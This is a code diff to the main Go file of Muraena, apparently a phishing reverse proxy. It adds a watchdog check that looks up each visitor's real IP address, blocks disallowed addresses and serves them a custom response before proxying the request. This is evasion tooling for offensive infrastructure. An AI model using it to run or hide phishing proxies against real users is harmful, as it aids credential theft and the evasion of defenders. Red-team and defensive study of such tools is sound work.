@@ -10,6 +10,7 @@ import (
 
 	"github.com/muraenateam/muraena/log"
 	"github.com/muraenateam/muraena/module"
+	"github.com/muraenateam/muraena/module/watchdog"
 	"github.com/muraenateam/muraena/proxy"
 	"github.com/muraenateam/muraena/session"
 
@@ -96,9 +97,29 @@ func main() {
 	//
 	// Start the reverse proxy
 	//
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/", func(response http.ResponseWriter, request *http.Request) {
+
+		if sess.Config.Watchdog.Enabled {
+			m, err := sess.Module("watchdog")
+			if err != nil {
+				log.Error("%s", err)
+			}
+
+			wd, ok := m.(*watchdog.Watchdog)
+			if ok {
+				// get the real IP of the user, see below
+				addr := wd.GetRealAddr(request)
+
+				if !wd.Allow(addr) {
+					wd.Error("[%s blocked]", addr.String())
+					wd.CustomResponse(response, request)
+					return
+				}
+			}
+		}
+
 		s := &proxy.SessionType{Session: sess, Replacer: replacer}
-		s.HandleFood(w, r)
+		s.HandleFood(response, request)
 	})
 
 	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.Port)
@@ -122,6 +143,7 @@ func main() {
 		if err := tlsServer.ServeTLS(listeningAddress); err != nil {
 			log.Fatal("Error binding Muraena on HTTPS: %s", err)
 		}
+
 	} else {
 		muraena := &http.Server{Addr: listeningAddress}
 		if err := muraena.ListenAndServe(); err != nil {
